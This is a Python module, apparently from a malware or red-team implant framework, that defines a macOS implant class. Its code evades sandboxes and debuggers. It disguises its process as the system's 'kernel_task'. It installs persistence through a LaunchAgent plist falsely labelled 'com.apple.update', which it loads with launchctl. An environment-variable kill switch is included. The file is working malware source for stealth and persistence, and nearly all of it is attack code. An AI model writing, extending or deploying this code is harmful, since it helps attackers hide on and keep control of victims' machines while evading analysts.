from .base_implant import BaseImplant
import platform
import sys
import os
import asyncio
import random

def apply_macos_stealth(implant):
    """MacOS-specific stealth"""
    from utilities.anti_analysis import AntiAnalysis
    anti = AntiAnalysis()
    if anti.detect_virtualization() or anti.detect_debugger():
        return

    # Masquerade as system process
    fake_name = "kernel_task"
    try:
        import setproctitle
        setproctitle.setproctitle(fake_name)
    except:
        pass

    # Delay
    delay = random.uniform(5, 20)
    asyncio.create_task(asyncio.sleep(delay))

    # Kill switch
    if os.environ.get("GG_KILL") == "1":
        sys.exit(0)

    # Hide in LaunchAgents (persistence)
    if implant.stealth_level == 'high':
        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(sys.argv[0])}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        os.system(f'launchctl load {plist_path}')

class MacOSImplant(BaseImplant):
    def __init__(self, config: dict):
        if platform.system().lower() != 'darwin':
            raise Warning("MacOSImplant on non-macOS; using BaseImplant")
        super().__init__(config)
        apply_macos_stealth(self)
